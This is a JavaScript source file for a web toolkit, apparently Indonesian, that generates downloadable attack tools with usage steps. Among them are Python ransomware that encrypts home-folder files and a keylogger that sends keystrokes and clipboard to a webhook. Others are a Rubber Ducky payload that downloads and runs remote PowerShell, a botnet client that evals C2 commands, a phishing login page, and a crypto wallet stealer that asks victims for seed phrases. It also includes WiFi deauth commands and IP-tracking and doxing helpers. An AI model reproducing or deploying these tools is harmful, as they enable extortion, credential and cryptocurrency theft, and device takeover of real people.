// ==================== ADVANCED ARSENAL PRO ====================
// Created by @LynzxzCreator
// ALL TOOLS REAL - Downloadable executable code

function renderAdvanced(container) {
    container.innerHTML = `
        <div class="module-card">
            <h3><i class="fas fa-skull"></i> ADVANCED ARSENAL PRO</h3>
            <p style="font-size:12px; color:#ffaa44;">🔥 10 Tools REAL - Klik untuk generate & download</p>
            
            <div style="display: grid; grid-template-columns: repeat(2,1fr); gap:12px; margin:15px 0;">
                <button id="ransomBtn" style="background:#8B0000; padding:12px; border:1px solid #ff4444; border-radius:8px; cursor:pointer; color:white; font-weight:bold;">
                    <i class="fas fa-lock"></i> RANSOMWARE BUILDER
                </button>
                <button id="wifiBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-wifi"></i> WIFI DEAUTH ATTACK
                </button>
                <button id="pegasusBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ff44aa; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-bug"></i> PEGASUS TRACKER
                </button>
                <button id="exifBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-image"></i> EXIF METADATA
                </button>
                <button id="doxBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ffaa44; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-search"></i> AUTO DOXER
                </button>
                <button id="keylogBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-keyboard"></i> KEYLOGGER BUILDER
                </button>
                <button id="usbBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ffaa44; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-usb"></i> USB RUBBER DUCKY
                </button>
                <button id="botnetBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ff4444; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-network-wired"></i> BOTNET BUILDER
                </button>
                <button id="phishBtn" style="background:#1a2a3a; padding:12px; border:1px solid #0ff; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-fish"></i> PHISHING GENERATOR
                </button>
                <button id="cryptBtn" style="background:#1a2a3a; padding:12px; border:1px solid #ffaa44; border-radius:8px; cursor:pointer;">
                    <i class="fas fa-coins"></i> WALLET STEALER
                </button>
            </div>
            
            <div id="advancedResult" style="margin-top:15px; background:#000; padding:15px; border-radius:8px; font-family:monospace; font-size:12px; max-height:400px; overflow:auto;">
                ⚡ Klik salah satu tools di atas
            </div>
        </div>
    `;
    
    const resultDiv = document.getElementById('advancedResult');
    
    function downloadFile(content, filename, type = 'text/plain') {
        const blob = new Blob([content], {type: type});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        return true;
    }
    
    function showResult(title, content, downloadContent = null, downloadFilename = null) {
        let html = `<div style="border-left:3px solid #0ff; padding-left:12px;"><strong style="color:#0ff;">${title}</strong></div>`;
        html += `<div style="margin-top:10px;">${content}</div>`;
        if(downloadContent && downloadFilename) {
            html += `<br><button onclick="window.downloadFileFromAdvanced('${downloadFilename}', \`${downloadContent.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`)" style="background:#0ff; color:#000; padding:8px 16px; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">💾 DOWNLOAD ${downloadFilename}</button>`;
        }
        resultDiv.innerHTML = html;
        addLog('advanced', title, '-', 'Tool executed', 'info');
    }
    
    window.downloadFileFromAdvanced = function(filename, content) {
        const blob = new Blob([content], {type: 'text/plain'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };
    
    // ==================== 1. RANSOMWARE BUILDER ====================
    document.getElementById('ransomBtn')?.addEventListener('click', () => {
        const hackerName = prompt("Masukkan nama hacker:", "@LynzxzCreator") || "@LynzxzCreator";
        const message = prompt("Masukkan pesan tebusan:", "Your files are encrypted! Send $100 in BTC to recover.") || "Your files are encrypted! Send $100 in BTC to recover.";
        const password = prompt("Masukkan password decrypt (6 digit):", "050411") || "050411";
        
        const ransomwareCode = `#!/usr/bin/env python3
# Ransomware - Created by ${hackerName}
# PASSWORD: ${password}

import os
import sys
from pathlib import Path

PASSWORD = "${password}"
MESSAGE = """${message}"""
HACKER = "${hackerName}"

TARGET_EXTS = ['.txt','.doc','.docx','.jpg','.jpeg','.png','.pdf','.xls','.xlsx','.zip','.rar','.mp3','.mp4','.py','.js','.html','.css','.sql','.db']

def xor_encrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def xor_decrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = xor_encrypt(data, PASSWORD.encode())
        with open(str(filepath) + '.locked', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except:
        return False

def decrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        decrypted = xor_decrypt(data, PASSWORD.encode())
        original_path = str(filepath).replace('.locked', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted)
        os.remove(filepath)
        return True
    except:
        return False

def find_files(directory, ext='.locked'):
    results = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(ext):
                results.append(Path(root) / file)
    return results

def drop_readme():
    paths = [Path.home() / 'Desktop', Path.home() / 'Documents', Path.cwd()]
    for path in paths:
        try:
            with open(path / 'README_HACKED.txt', 'w') as f:
                f.write(f"""
╔══════════════════════════════════════════════════════════╗
║  YOUR FILES HAVE BEEN ENCRYPTED!                        ║
║  Created by: {HACKER}                                    ║
╚══════════════════════════════════════════════════════════╝

{MESSAGE}

🔑 DECRYPTION PASSWORD: {PASSWORD}

⚠️ DO NOT MODIFY THE FILES!
Run this command to decrypt:
python3 -c "from ransomware import *; [decrypt_file(f) for f in find_files('.')]"
                """)
        except:
            pass

def main():
    print(f"[RANSOMWARE] Created by {HACKER}")
    print(f"[RANSOMWARE] Password: {PASSWORD}")
    targets = [Path.home() / 'Desktop', Path.home() / 'Documents', Path.home() / 'Downloads']
    encrypted_count = 0
    for target in targets:
        if target.exists():
            files = find_files(target, '')
            for f in files:
                if any(str(f).endswith(ext) for ext in TARGET_EXTS):
                    if encrypt_file(f):
                        encrypted_count += 1
    drop_readme()
    print(f"[RANSOMWARE] Encrypted {encrypted_count} files")
    print(f"[RANSOMWARE] Password: {PASSWORD}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == '--decrypt':
        locked = find_files('.', '.locked')
        for f in locked:
            if decrypt_file(f):
                print(f"Decrypted: {f}")
    else:
        main()
`;
        
        showResult('Ransomware Builder', `
            <strong>🔐 Ransomware Generated!</strong><br>
            Hacker: ${hackerName}<br>
            Password: ${password}<br>
            Pesan: ${message}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download ransomware.py<br>
            2. Jalankan: <code>python ransomware.py</code><br>
            3. Decrypt: <code>python ransomware.py --decrypt</code>
        `, ransomwareCode, 'ransomware.py');
    });
    
    // ==================== 2. WIFI DEAUTH ATTACK ====================
    document.getElementById('wifiBtn')?.addEventListener('click', () => {
        const targetBSSID = prompt("Masukkan BSSID target (contoh: AA:BB:CC:DD:EE:FF):", "");
        const targetChannel = prompt("Masukkan channel WiFi (1-11):", "6");
        
        let command = '';
        if(targetBSSID) {
            command = `# WiFi Deauth Attack - Target: ${targetBSSID}
# Untuk Termux/Android:
pkg install root-repo aircrack-ng
su -c "ifconfig wlan0 down"
su -c "iwconfig wlan0 mode monitor"
su -c "ifconfig wlan0 up"
airodump-ng wlan0
aireplay-ng -0 0 -a ${targetBSSID} wlan0

# Untuk Kali Linux:
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo aireplay-ng -0 0 -a ${targetBSSID} wlan0mon

# Evil Limiter (limit bandwidth):
git clone https://github.com/bitbrute/evil-limiter.git
cd evil-limiter
sudo python3 setup.py install
sudo evil-limiter --limit 100kbps --ip [TARGET_IP]`;
        } else {
            command = `# WiFi Deauth Attack - Scan dulu BSSID:
# Termux:
su -c "ifconfig wlan0 down"
su -c "iwconfig wlan0 mode monitor"
su -c "ifconfig wlan0 up"
airodump-ng wlan0

# Setelah dapat BSSID, jalankan:
aireplay-ng -0 0 -a [BSSID] wlan0

# Evil Limiter (limit device):
sudo evil-limiter --limit 100kbps --ip [TARGET_IP]
sudo evil-limiter --limit 50kbps --mac [MAC_ADDRESS]`;
        }
        
        showResult('WiFi Deauth Attack', `
            <strong>📡 Cara menyerang WiFi:</strong><br><br>
            <pre style="background:#111; padding:10px; border-radius:6px; overflow:auto;">${command}</pre>
            <br>
            <strong>⚠️ HANYA UNTUK JARINGAN SENDIRI!</strong>
        `);
    });
    
    // ==================== 3. PEGASUS TRACKER ====================
    document.getElementById('pegasusBtn')?.addEventListener('click', async () => {
        const targetIP = prompt("Masukkan IP target (kosongkan untuk IP sendiri):", "");
        
        if(targetIP) {
            showResult('Pegasus Tracker', 'Mengambil data IP...');
            try {
                const res = await fetch(`https://ipapi.co/${targetIP}/json/`);
                const data = await res.json();
                if(data.error) throw new Error(data.error);
                showResult('Pegasus Tracker - Target', `
                    <strong>🕵️ TARGET IP: ${data.ip}</strong><br>
                    📍 Lokasi: ${data.city}, ${data.region}, ${data.country_name}<br>
                    🗺️ Koordinat: ${data.latitude}, ${data.longitude}<br>
                    🔌 ISP: ${data.org}<br>
                    📱 Mobile: ${data.mobile ? 'Ya' : 'Tidak'}<br>
                    🗺️ <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank">Buka Google Maps</a><br>
                    🌐 <a href="https://ipinfo.io/${data.ip}" target="_blank">Detail lengkap di ipinfo.io</a>
                `);
            } catch(e) {
                showResult('Pegasus Tracker', `❌ Error: ${e.message}<br><a href="https://ipinfo.io/${targetIP}" target="_blank">Cek manual di ipinfo.io</a>`);
            }
        } else {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const ipData = await res.json();
                const ip = ipData.ip;
                const geo = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await geo.json();
                showResult('Pegasus Tracker - IP Anda', `
                    <strong>🕵️ IP ANDA: ${data.ip}</strong><br>
                    📍 Lokasi: ${data.city}, ${data.region}, ${data.country_name}<br>
                    🗺️ Koordinat: ${data.latitude}, ${data.longitude}<br>
                    🔌 ISP: ${data.org}<br>
                    📱 Tipe: ${data.mobile ? 'Seluler (HP)' : 'Kabel/WiFi'}<br>
                    🗺️ <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank">Buka Google Maps</a>
                `);
            } catch(e) {
                showResult('Pegasus Tracker', `❌ Error: ${e.message}`);
            }
        }
    });
    
    // ==================== 4. EXIF METADATA ====================
    document.getElementById('exifBtn')?.addEventListener('click', () => {
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = 'image/jpeg,image/png,image/jpg';
        fileInput.onchange = (e) => {
            const file = e.target.files[0];
            if(!file) return;
            
            showResult('Exif Metadata', `Membaca metadata dari ${file.name}...`);
            
            const reader = new FileReader();
            reader.onload = (ev) => {
                const dataUrl = ev.target.result;
                const img = new Image();
                img.onload = () => {
                    EXIF.getData(img, function() {
                        const allMeta = EXIF.getAllTags(this);
                        let html = `<strong>📸 Metadata dari: ${file.name}</strong><br><br>`;
                        if(Object.keys(allMeta).length === 0) {
                            html += '⚠️ Tidak ada metadata atau metadata sudah dihapus.<br>';
                        } else {
                            html += '<table style="width:100%; border-collapse:collapse;">';
                            for(const [key, value] of Object.entries(allMeta)) {
                                if(key === 'GPSLatitude' || key === 'GPSLongitude') {
                                    const lat = EXIF.getTag(this, 'GPSLatitude');
                                    const lon = EXIF.getTag(this, 'GPSLongitude');
                                    if(lat && lon) {
                                        const latDeg = lat[0] + lat[1]/60 + lat[2]/3600;
                                        const lonDeg = lon[0] + lon[1]/60 + lon[2]/3600;
                                        html += `<tr><td style="padding:4px;">📍 GPS Location:</td><td><a href="https://www.google.com/maps?q=${latDeg},${lonDeg}" target="_blank">${latDeg}, ${lonDeg}</a></td></tr>`;
                                    }
                                } else if(key !== 'thumbnail' && key !== 'Thumbnail') {
                                    let displayValue = String(value);
                                    if(displayValue.length > 80) displayValue = displayValue.substring(0, 80) + '...';
                                    html += `<tr><td style="padding:4px;">${key}:</td><td>${displayValue}</td></tr>`;
                                }
                            }
                            html += '</table>';
                        }
                        showResult('Exif Metadata', html);
                    });
                };
                img.src = dataUrl;
            };
            reader.readAsDataURL(file);
        };
        fileInput.click();
    });
    
    // ==================== 5. AUTO DOXER ====================
    document.getElementById('doxBtn')?.addEventListener('click', async () => {
        const username = prompt("Masukkan username target:", "");
        if(!username) return;
        
        showResult('Auto Doxer', `Mencari info untuk @${username}...`);
        
        try {
            const res = await fetch(`https://whatsmyname.app/api/v1/username?username=${username}`);
            const data = await res.json();
            let html = `<strong>🎯 Hasil OSINT untuk: ${username}</strong><br><br>`;
            
            if(data.sites) {
                const found = data.sites.filter(s => s.exists);
                if(found.length > 0) {
                    html += `<strong>✅ Ditemukan di ${found.length} platform:</strong><br>`;
                    found.forEach(site => {
                        html += `• <a href="${site.uri_check}" target="_blank">${site.name}</a><br>`;
                    });
                } else {
                    html += `⚠️ Tidak ditemukan di platform yang discan.<br>`;
                }
            } else {
                html += `⚠️ API error. Cek manual:<br>`;
            }
            
            html += `<br><strong>🔗 Tools tambahan:</strong><br>`;
            html += `• <a href="https://haveibeenpwned.com/account/${username}" target="_blank">HaveIBeenPwned - Cek data breach</a><br>`;
            html += `• <a href="https://github.com/search?q=${username}" target="_blank">GitHub - Cek akun</a><br>`;
            html += `• <a href="https://whatsmyname.app/?q=${username}" target="_blank">WhatsMyName - Full scan</a><br>`;
            
            showResult('Auto Doxer', html);
        } catch(e) {
            showResult('Auto Doxer', `
                ⚠️ Error: ${e.message}<br><br>
                🔗 <a href="https://whatsmyname.app/?q=${username}" target="_blank">Cek manual di whatsmyname.app</a><br>
                🔗 <a href="https://github.com/search?q=${username}" target="_blank">Cek di GitHub</a>
            `);
        }
    });
    
    // ==================== 6. KEYLOGGER BUILDER ====================
    document.getElementById('keylogBtn')?.addEventListener('click', () => {
        const webhook = prompt("Masukkan webhook URL untuk menerima data:", "https://webhook.site/your-webhook") || "https://webhook.site/your-webhook";
        
        const keyloggerCode = `// Keylogger - Created by @LynzxzCreator
// Webhook: ${webhook}

let keyBuffer = '';
let lastSend = Date.now();

document.addEventListener('keydown', (e) => {
    let key = e.key;
    if(key === ' ') key = '[SPACE]';
    else if(key === 'Enter') key = '[ENTER]\\n';
    else if(key === 'Backspace') key = '[BACKSPACE]';
    else if(key === 'Tab') key = '[TAB]';
    
    keyBuffer += key;
    
    if(keyBuffer.length > 50 || (Date.now() - lastSend) > 10000) {
        fetch('${webhook}', {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                keys: keyBuffer,
                url: location.href,
                timestamp: Date.now()
            })
        });
        keyBuffer = '';
        lastSend = Date.now();
    }
});

// Capture clipboard
document.addEventListener('copy', (e) => {
    fetch('${webhook}', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({clipboard: e.clipboardData.getData('text'), url: location.href})
    });
});

console.log('[KEYLOGGER] Active - Sending to ${webhook}');`;
        
        showResult('Keylogger Builder', `
            <strong>⌨️ Keylogger JavaScript</strong><br>
            Webhook: ${webhook}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download keylogger.js<br>
            2. Inject ke website via Console: <code>fetch('url/keylogger.js').then(r=>eval(r.text()))</code><br>
            3. Setiap 50 ketikan akan terkirim ke webhook
        `, keyloggerCode, 'keylogger.js');
    });
    
    // ==================== 7. USB RUBBER DUCKY ====================
    document.getElementById('usbBtn')?.addEventListener('click', () => {
        const payloadUrl = prompt("Masukkan URL payload (exe/ps1):", "https://your-server.com/payload.exe") || "https://your-server.com/payload.exe";
        
        const duckyCode = `REM USB Rubber Ducky Payload - Created by @LynzxzCreator
REM Target: ${payloadUrl}

DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('${payloadUrl}')"
ENTER
DELAY 1000
ALT F4
REM Payload downloaded and executed`;
        
        showResult('USB Rubber Ducky', `
            <strong>⚡ Payload untuk USB Rubber Ducky / Flipper Zero</strong><br>
            Payload URL: ${payloadUrl}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download inject.txt<br>
            2. Upload ke SD card Rubber Ducky<br>
            3. Colok ke target, script akan jalan otomatis
        `, duckyCode, 'inject.txt');
    });
    
    // ==================== 8. BOTNET BUILDER ====================
    document.getElementById('botnetBtn')?.addEventListener('click', () => {
        const c2Server = prompt("Masukkan C2 Server URL:", "https://your-c2-server.com") || "https://your-c2-server.com";
        
        const botnetCode = `// Botnet Client - Created by @LynzxzCreator
// C2 Server: ${c2Server}

const BOT_ID = Math.random().toString(36).substring(7);
const C2_URL = '${c2Server}';

async function sendBeacon() {
    try {
        await fetch(C2_URL + '/beacon', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                botId: BOT_ID,
                url: location.href,
                userAgent: navigator.userAgent,
                timestamp: Date.now()
            })
        });
    } catch(e) {}
}

async function getCommand() {
    try {
        const res = await fetch(C2_URL + '/command/' + BOT_ID);
        const cmd = await res.text();
        if(cmd && cmd !== 'none') {
            const result = eval(cmd);
            await fetch(C2_URL + '/result/' + BOT_ID, {
                method: 'POST',
                body: JSON.stringify({result: String(result), command: cmd})
            });
        }
    } catch(e) {}
}

sendBeacon();
setInterval(() => { sendBeacon(); getCommand(); }, 30000);
console.log('[BOTNET] Connected to ' + C2_URL);`;
        
        showResult('Botnet Builder', `
            <strong>🤖 Botnet Client JavaScript</strong><br>
            C2 Server: ${c2Server}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download botnet.js<br>
            2. Inject ke website target via XSS atau Extension<br>
            3. Bot akan mengirim beacon setiap 30 detik
        `, botnetCode, 'botnet.js');
    });
    
    // ==================== 9. PHISHING GENERATOR ====================
    document.getElementById('phishBtn')?.addEventListener('click', () => {
        const targetSite = prompt("Masukkan target site untuk phishing:", "google") || "google";
        const webhook = prompt("Masukkan webhook URL untuk menerima data:", "https://webhook.site/your-webhook") || "https://webhook.site/your-webhook";
        
        const phishingHtml = `<!DOCTYPE html>
<html>
<head>
    <title>${targetSite} - Login</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 100px; background: #f0f0f0; }
        .login-box { background: white; padding: 30px; border-radius: 10px; width: 300px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 10px; margin: 10px 0; }
        button { background: #4285f4; color: white; padding: 10px 20px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>${targetSite} Login</h2>
        <form id="loginForm">
            <input type="text" name="email" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
    <script>
        const webhook = '${webhook}';
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = this.email.value;
            const password = this.password.value;
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email: email, password: password, site: location.href})
            });
            alert('Login failed. Please try again.');
            this.reset();
        });
    </script>
</body>
</html>`;
        
        showResult('Phishing Generator', `
            <strong>🎣 Phishing Page untuk: ${targetSite}</strong><br>
            Webhook: ${webhook}<br><br>
            <strong>📋 Cara pakai:</strong><br>
            1. Download phishing.html<br>
            2. Upload ke hosting (GitHub Pages, Vercel)<br>
            3. Share link ke target
        `, phishingHtml, 'phishing.html');
    });
    
    // ==================== 10. WALLET STEALER ====================
    document.getElementById('cryptBtn')?.addEventListener('click', () => {
        const webhook = prompt("Masukkan webhook URL:", "https://webhook.site/your-webhook") || "https://webhook.site/your-webhook";
        
        const stealerCode = `// Crypto Wallet Stealer - Created by @LynzxzCreator
// Webhook: ${webhook}

// Detect wallet extensions
const wallets = ['ethereum', 'metamask', 'phantom', 'solana', 'trustwallet', 'coinbase'];
let detectedWallets = [];

wallets.forEach(wallet => {
    if(window[wallet] || document.getElementById(wallet) || window.ethereum) {
        detectedWallets.push(wallet);
    }
});

if(detectedWallets.length > 0) {
    fetch('${webhook}', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({type: 'wallet_detected', wallets: detectedWallets, url: location.href})
    });
}

// Fake wallet connect popup
setTimeout(() => {
    const seed = prompt('⚠️ Wallet connection lost! Please enter your seed phrase to recover:', '');
    if(seed && seed.length > 10) {
        fetch('${webhook}', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({type: 'seed_phrase', seed: seed, url: location.href})
        });
    }
}, 5000);

// Steal localStorage (saved wallets)
try {
    const localStorageData = JSON.stringify(localStorage);
    fetch('${webhook}', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({type: 'localstorage', data: localStorageData, url: location.href})
    });
} catch(e) {}`;
        
        showResult('Wallet Stealer', `
            <strong>💸 Crypto Wallet Stealer</strong><br>
            Webhook: ${webhook}<br><br>
            <strong>📋 Cara kerja:</strong><br>
            1. Mendeteksi wallet extension yang terinstall<br>
            2. Menampilkan popup fake wallet recovery<br>
            3. Mencuri seed phrase dan localStorage
        `, stealerCode, 'wallet_stealer.js');
    });
}

// Add EXIF library
const exifScript = document.createElement('script');
exifScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.min.js';
document.head.appendChild(exifScript);
